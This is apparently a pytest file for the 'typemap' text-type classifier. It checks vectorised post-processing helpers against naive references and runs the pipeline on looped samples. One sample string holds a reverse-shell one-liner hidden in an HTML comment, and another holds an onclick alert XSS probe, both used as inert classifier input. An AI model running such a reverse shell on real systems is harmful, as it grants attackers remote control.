"""Regression guards for the vectorised post-processing helpers.

The hot helpers (``_runs``, ``relabel_whitespace``, ``confidence_gate``,
``build_segments``) were rewritten from per-character Python loops to vectorised
numpy. Each must stay bit-identical to a naive reference. We also run the full
pipeline on representative samples *looped* x1/x4/x16 so inputs cross the
1536-byte U-Net window (multi-window seams) and post-processing runs over long
sequences -- the regime where the optimisations matter.
"""
import random

import numpy as np
import pytest

import typemap
from typemap import _postprocess as pp


# --- naive references (the pre-optimisation implementations) ---------------

def _runs_naive(labels):
    runs = []
    if not labels:
        return runs
    start = 0
    for i in range(1, len(labels) + 1):
        if i == len(labels) or labels[i] != labels[start]:
            runs.append((start, i, labels[start]))
            start = i
    return runs


def _relabel_naive(text, labels):
    n = len(text)
    if n == 0:
        return labels
    is_ws = [c in pp._WHITESPACE for c in text]
    if not any(is_ws):
        return labels
    left, right = [-1] * n, [-1] * n
    last = -1
    for i in range(n):
        if not is_ws[i]:
            last = labels[i]
        left[i] = last
    last = -1
    for i in range(n - 1, -1, -1):
        if not is_ws[i]:
            last = labels[i]
        right[i] = last
    out = list(labels)
    for i in range(n):
        if is_ws[i]:
            if left[i] != -1:
                out[i] = left[i]
            elif right[i] != -1:
                out[i] = right[i]
    return out


def _gate_naive(char_probs, labels, threshold, other_index):
    if threshold <= 0.0 or char_probs.size == 0:
        return labels
    maxp = char_probs.max(axis=1)
    return [other_index if maxp[i] < threshold else lab for i, lab in enumerate(labels)]


# --- helper parity ---------------------------------------------------------

def test_runs_matches_naive():
    rng = random.Random(0)
    for _ in range(500):
        n = rng.randint(0, 300)
        labels = [rng.randint(0, 4) for _ in range(n)]
        assert pp._runs(labels) == _runs_naive(labels)


def test_relabel_whitespace_matches_naive():
    rng = random.Random(1)
    alphabets = ["ab \t\n", "x ", " \t\n\r", "abcde "]
    for _ in range(2000):
        n = rng.randint(0, 60)
        alpha = rng.choice(alphabets)
        text = "".join(rng.choice(alpha) for _ in range(n))
        labels = [rng.randint(0, 6) for _ in range(n)]
        assert pp.relabel_whitespace(text, list(labels)) == _relabel_naive(text, list(labels))


def test_confidence_gate_matches_naive():
    rng = np.random.default_rng(2)
    for _ in range(200):
        n = int(rng.integers(0, 400))
        cp = rng.random((n, 35)).astype(np.float32)
        labels = [int(x) for x in rng.integers(0, 35, n)]
        for thr in (0.0, 0.1, 0.3, 0.9):
            got = pp.confidence_gate(cp, list(labels), thr, 35)
            assert got == _gate_naive(cp, list(labels), thr, 35)
            if thr > 0 and n > 0:  # gated path returns Python ints (not numpy scalars)
                assert all(isinstance(x, int) for x in got)


# --- full pipeline on looped samples (multi-window) ------------------------

SAMPLES = [
    '.btn { color: #3498db; }\nconst f = (x) => x + 1;\n<div onclick="alert(1)">hi</div>\n'
    "UPDATE life SET status = 'ok' WHERE n > 9;\n<!-- sh -i >& /dev/udp/1.2.3.4/9 0>&1 -->\n",
    '{\n  "users": [{"id": 1, "name": "Alice"}, {"id": 2, "name": "Bob"}],\n  "page": 1\n}',
    "# My Project\n\n```\npip install x\n```\n\nA tool that does `things`. MIT.\n",
    "FROM python:3.12-slim\nRUN apt-get update && rm -rf /var/lib/apt/lists/*\nCMD [\"app\"]\n",
]


@pytest.mark.parametrize("k", [1, 4, 16])
@pytest.mark.parametrize("fn", [typemap.fast, typemap.precise])
def test_pipeline_consistent_on_looped_samples(fn, k):
    for s in SAMPLES:
        text = s * k
        r = fn(text)
        n = len(text)
        # per-char arrays line up with the text length
        assert len(r.char_labels) == n
        assert len(r.char_confidence) == n
        assert r.char_probs.shape == (n, len(r.labels))
        # segments tile the whole text contiguously, no gaps/overlaps
        assert r.segments[0].start == 0
        assert r.segments[-1].end == n
        for a, b in zip(r.segments, r.segments[1:]):
            assert a.end == b.start
        # each segment's label matches the per-char labels it covers
        for seg in r.segments:
            assert all(lab == seg.label for lab in r.char_labels[seg.start:seg.end])


def test_pipeline_deterministic_when_looped():
    for fn in (typemap.fast, typemap.precise):
        text = SAMPLES[0] * 8
        a, b = fn(text), fn(text)
        assert a.char_labels == b.char_labels
        assert [s.label for s in a.segments] == [s.label for s in b.segments]
